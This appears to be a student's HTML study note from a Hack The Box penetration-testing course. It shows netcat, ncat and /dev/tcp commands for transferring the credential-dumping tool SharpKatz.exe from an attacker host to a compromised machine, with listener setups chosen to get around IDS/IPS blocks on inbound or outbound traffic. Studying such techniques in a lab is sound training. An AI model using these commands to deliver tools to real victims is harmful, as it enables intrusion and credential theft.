<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Netcat for FileTransfer</title>
</head><body>Listener on Compromised Machine sending from Attacker:<br/>
(when IDS/IPS blocks outbound traffic)<ul><li style="list-style-type: none">Using old original Netcat:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Start listener on Compromised machine and write incoming data into a file</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">victim@target:~$ # Example using Original Netcat</li>
<li style="list-style-type: none">victim@target:~$ nc -l -p 8000 &gt; SharpKatz.exe</li>
</ul>
</li>
<li style="list-style-type: none">Send the data from our attacking machine;</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Momothechi@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe</li>
<li style="list-style-type: none">Momothechi@htb[/htb]$ # Example using Original Netcat</li>
<li style="list-style-type: none">Momothechi@htb[/htb]$ nc -q 0 192.168.49.128 8000 &lt; SharpKatz.exe</li>
</ul>
</li>
</ul>
</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">Using modern Ncat:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">starting listener:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">victim@target:~$ # Example using Ncat</li>
<li style="list-style-type: none">victim@target:~$ ncat -l -p 8000 --recv-only &gt; SharpKatz.exe</li>
</ul>
</li>
<li style="list-style-type: none">And send from attacking machine:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Momothechi@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe</li>
<li style="list-style-type: none">Momothechi@htb[/htb]$ # Example using Ncat</li>
<li style="list-style-type: none">Momothechi@htb[/htb]$ ncat --send-only 192.168.49.128 8000 &lt; SharpKatz.exe</li>
</ul>
</li>
</ul>
</li>
</ul>
<br/>
<br/>
Listenere on Attacking machine connecting from compromised:<br/>
(when IDS/IPS) blocks incoming traffic.<ul><li style="list-style-type: none">Using old original Netcat:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Start listener with input file:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Momothechi@htb[/htb]$ # Example using Original Netcat</li>
<li style="list-style-type: none">Momothechi@htb[/htb]$ sudo nc -l -p 443 -q 0 &lt; SharpKatz.exe</li>
</ul>
</li>
<li style="list-style-type: none">Connect from the compromised machine:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">victim@target:~$ # Example using Original Netcat</li>
<li style="list-style-type: none">victim@target:~$ nc 192.168.49.128 443 &gt; SharpKatz.exe</li>
</ul>
</li>
</ul>
</li>
<li style="list-style-type: none">Using Ncat:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Strt listener:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Momothechi@htb[/htb]$ # Example using Ncat</li>
<li style="list-style-type: none">Momothechi@htb[/htb]$ sudo ncat -l -p 443 --send-only &lt; SharpKatz.exe</li>
</ul>
</li>
<li style="list-style-type: none">Connect:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">victim@target:~$ # Example using Ncat</li>
<li style="list-style-type: none">victim@target:~$ ncat 192.168.49.128 443 --recv-only &gt; SharpKatz.exe</li>
</ul>
</li>
<li style="list-style-type: none"></li>
</ul>
</li>
</ul>
When we dont have Ncat/Netcat on compromised machine - use /dev/tcp<ul><li style="list-style-type: none">Starting listener on attacking machine with file input:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Momothechi@htb[/htb]$ # Example using Ncat</li>
<li style="list-style-type: none">Momothechi@htb[/htb]$ sudo ncat -l -p 443 --send-only &lt; SharpKatz.exe</li>
</ul>
</li>
<li style="list-style-type: none">Connecting on the compromised machine using /dev/tcp:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">victim@target:~$ cat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe</li>
<li style="list-style-type: none"></li>
</ul>
</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"><ul><li style="list-style-type: none"></li>
</ul>
</li>
</ul>
&#09;</body></html>